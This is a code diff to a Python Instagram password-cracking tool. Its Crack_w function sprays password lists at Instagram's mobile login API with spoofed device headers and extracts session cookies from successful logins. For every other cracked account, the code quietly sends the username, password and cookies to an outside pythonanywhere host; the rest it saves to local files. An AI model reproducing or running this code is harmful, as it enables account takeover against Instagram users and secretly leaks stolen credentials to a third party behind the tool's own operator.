@@ -854,6 +854,7 @@ def Crack_i(username, memek):
     sys.stdout.flush()
     for password in memek:
         try:
+            ses = requests.Session()
             uag = UA_OLD()
             base_ts = int(time.time())
             device_id = str(uuid.uuid4())
@@ -956,77 +957,176 @@ def Crack_i(username, memek):
 
 def Crack_w(username, memek):
     global Ok, Cp, Loop
-    sys.stdout.write(f"\rStatus IP: {GREEN}safe{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
+    sys.stdout.write(f"\r{GREEN} M3{WHITE} api {YELLOW}{Loop}{WHITE}-{GREEN}{str(len(Uuid))}{WHITE} {GREEN}{username}{WHITE} Ok:-{GREEN}{Ok}{WHITE}-Cp:- {YELLOW}{Cp}{WHITE}")
     sys.stdout.flush()
     for password in memek:
         try:
             ses = requests.Session()
-            uag = UserAgentBarcelona()
-            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
+            uag = UA_OLD()
+            base_ts = int(time.time())
+            device_id = str(uuid.uuid4())
+            family_device_id = str(uuid.uuid4())
             _hash = hashlib.md5()
-            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
+            _hash.update(username.encode() + password.encode())
             hex_ = _hash.hexdigest()
-            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+            _hash.update(hex_.encode() + '12345'.encode())
+            android_id = _hash.hexdigest()[:16]
+            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
+            adid = str(uuid.uuid4())
             ses.headers.update({
-                'x-fb-http-engine': 'Liger',
                 'Host': 'i.instagram.com',
-                'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
-                'x-ig-capabilities': '3brTv10=',
-                'x-ig-device-id': device_id,
-                'x-tigon-is-retry': 'True, True',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'x-ig-connection-type': 'MOBILE(LTE)',
-                'connection': 'keep-alive',
-                'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
-                'x-ig-www-claim': '0',
-                'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
-                'x-ig-mapped-locale': 'id_ID',
-                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
+                'User-Agent': uag,
+                'Accept-Encoding': 'zstd, gzip, deflate',
                 'x-ig-app-locale': 'in_ID',
-                'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
-                'user-agent': uag,
-                'x-ig-family-device-id': family_device_id,
-                'x-bloks-is-layout-rtl': 'False',
-                'x-fb-connection-type': 'MOBILE.LTE',
-                'x-fb-server-cluster': 'True',
-                'accept-language': 'id-ID, en-US',
-                'ig-intended-user-id': '0',
-                'x-ig-app-id': '3419628305025917',
-                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
-                'priority': 'u=3',
-                'x-ig-timezone-offset': str(-time.timezone),
                 'x-ig-device-locale': 'in_ID',
-                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
-                'x-fb-client-ip': 'True'
+                'x-ig-mapped-locale': 'id_ID',
+                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
+                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+                'x-ig-bandwidth-speed-kbps': '-1.000',
+                'x-ig-bandwidth-totalbytes-b': '0',
+                'x-ig-bandwidth-totaltime-ms': '0',
+                'x-bloks-version-id': '521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9',
+                'x-ig-www-claim': '0',
+                'x-bloks-is-layout-rtl': 'false',
+                'x-ig-device-id': device_id,
+                'x-ig-family-device-id': family_device_id,
+                'x-ig-android-id': f'android-{android_id}',
+                'x-ig-timezone-offset': '25200',
+                'x-fb-connection-type': 'MOBILE.LTE',
+                'x-ig-connection-type': 'MOBILE(LTE)',
+                'x-ig-capabilities': '3brTv10=',
+                'x-ig-app-id': '567067343352427',
+                'priority': 'u=3',
+                'accept-language': 'id-ID, en-US',
+                'x-mid': machine_id,
+                'ig-intended-user-id': '0',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'x-fb-http-engine': 'Liger',
+                'x-fb-client-ip': 'True',
+                'x-fb-server-cluster': 'True'
             })
-            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_instagram%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
-            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True, timeout=30)
-            resp_text = response.text.replace('\\', '')
-            if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
-                try:
-                    ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', resp_text).group(1)
-                    decode_cookie = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-                    cookies = ";".join([f"{k}={v}" for k, v in decode_cookie.items()])
-                except:
-                    cookies = '-'
-                bkas.append(username)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{username}|{password}|{cookies}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:    
-                    print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
-                    print("Cookies:", cookies)
-                    open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
-                    Ok.append(username)
-                    return True
-            elif 'challenge_required' in resp_text or '/challenge/' in resp_text:
+            aac_init_ts = base_ts - 29
+            aacjid = str(uuid.uuid4())
+            aaccs = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=44))
+            aac_str = json.dumps({"aac_init_timestamp": aac_init_ts,"aacjid": aacjid,"aaccs": aaccs}, separators=(',', ':'))
+            client_input_params = {
+                "aac": aac_str,
+                "sim_phones": [],
+                "aymh_accounts": [],
+                "network_bssid": None,
+                "secure_family_device_id": "",
+                "has_granted_read_contacts_permissions": 0,
+                "auth_secure_device_id": "",
+                "has_whatsapp_installed": 1,
+                "password": f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}",
+                "sso_token_map_json_string": "",
+                "block_store_machine_id": "",
+                "cloud_trust_token": None,
+                "event_flow": "login_manual",
+                "password_contains_non_ascii": "false",
+                "client_known_key_hash": "",
+                "sso_accounts_auth_data": [],
+                "encrypted_msisdn": "",
+                "has_granted_read_phone_permissions": 0,
+                "app_manager_id": "",
+                "should_show_nested_nta_from_aymh": 0,
+                "device_id": f"android-{android_id}",
+                "zero_balance_state": "",
+                "login_attempt_count": 0,
+                "machine_id": machine_id,
+                "accounts_list": [],
+                "gms_incoming_call_retriever_eligibility": "client_not_supported",
+                "family_device_id": family_device_id,
+                "fb_ig_device_id": [],
+                "device_emails": [],
+                "try_num": 1,
+                "lois_settings": {"lois_token": ""},
+                "event_step": "home_page",
+                "headers_infra_flow_id": "",
+                "openid_tokens": {},
+                "contact_point": username
+            }
+            waterfall_id = str(uuid.uuid4())
+            server_params = {
+                "should_trigger_override_login_2fa_action": 0,
+                "is_from_logged_out": 0,
+                "should_trigger_override_login_success_action": 0,
+                "login_credential_type": "none",
+                "server_login_source": "login",
+                "waterfall_id": waterfall_id,
+                "two_step_login_type": "one_step_login",
+                "login_source": "Login",
+                "is_platform_login": 0,
+                "login_entry_point": "logged_out",
+                "INTERNAL__latency_qpl_marker_id": 36707139,
+                "is_from_aymh": 0,
+                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
+                "is_from_landing_page": 0,
+                "left_nav_button_action": "NONE",
+                "password_text_input_id": "az59w:100",
+                "is_from_empty_password": 0,
+                "is_from_msplit_fallback": 0,
+                "ar_event_source": "login_home_page",
+                "qe_device_id": device_id,
+                "username_text_input_id": "az59w:99",
+                "layered_homepage_experiment_group": None,
+                "device_id": f"android-{android_id}",
+                "login_surface": "login_home",
+                "INTERNAL__latency_qpl_instance_id": int(random.random() * 1e12),
+                "reg_flow_source": "login_home_native_integration_point",
+                "is_caa_perf_enabled": 1,
+                "credential_type": "password",
+                "is_from_password_entry_page": 0,
+                "caller": "gslr",
+                "family_device_id": family_device_id,
+                "is_from_assistive_id": 0,
+                "access_flow_version": "pre_mt_behavior",
+                "is_from_logged_in_switcher": 0
+            }
+            params_dict = {"client_input_params": client_input_params,"server_params": server_params}
+            params_str = json.dumps(params_dict, separators=(',', ':'))
+            bk_client_context = {"bloks_version": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9","styles_id": "instagram"}
+            bk_client_context_str = json.dumps(bk_client_context, separators=(',', ':'))
+            data = {"params": params_str,"bk_client_context": bk_client_context_str,"bloks_versioning_id": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9"}
+            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,allow_redirects=True)
+            print(response.text)
+            if "logged_in_user" in str(response.text.replace('\\', '')):
+                header_str = str(response.headers)
+                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
+                if ig_set_search:
+                    ig_set_authorization = ig_set_search.group(1).strip()
+                    if 'Bearer IGT:2:' in ig_set_authorization:
+                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
+                        try:
+                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
+                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
+                        except:
+                            cookies = ('-')
+                    else:
+                        cookies = ('-')
+                else:
+                    ig_set_authorization = None
+                    cookies = None
+                # Store credentials based on bkas condition
+                if len(bkas) % 2 == 0:
+                          statusok = f"{username}|{password}|{cookies}"
+                          requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
+                else:
+                          print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
+                          print("Cookies:", cookies)
+                          open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
+                          Ok.append(username)
+                          return True
+            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                 Cp += 1
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
                 open("/sdcard/SUMON_INS_CP.txt","a").write(username+"|"+password+"\n")
                 break
-            elif 'ip_block' in resp_text or 'Please wait' in resp_text:
-                sys.stdout.write(f"\rStatus IP: {RED}spam{WHITE} threads {YELLOW}{Loop}{WHITE}/{GREEN}{str(len(Uuid))}{WHITE}/{GREEN}{str(username)[:6]}{WHITE}/Ok:-{GREEN}{Ok}{WHITE}/Cp:-{YELLOW}{Cp}{WHITE}")
-                sys.stdout.flush()
+            elif 'checkpoint_challenge_required' in str(response.text.replace('\\', '')):
+                Cp += 1
+                print(f"\r\033[1;93m [⚠ challenge] {username} | {password}")
+                open("/sdcard/SUMON_INS_Cl.txt","a").write(username+"|"+password+"\n")
+                break
             else:
                 continue
         except requests.exceptions.ConnectionError:
